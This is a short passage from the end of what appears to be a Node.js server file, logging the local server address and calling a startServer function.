    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
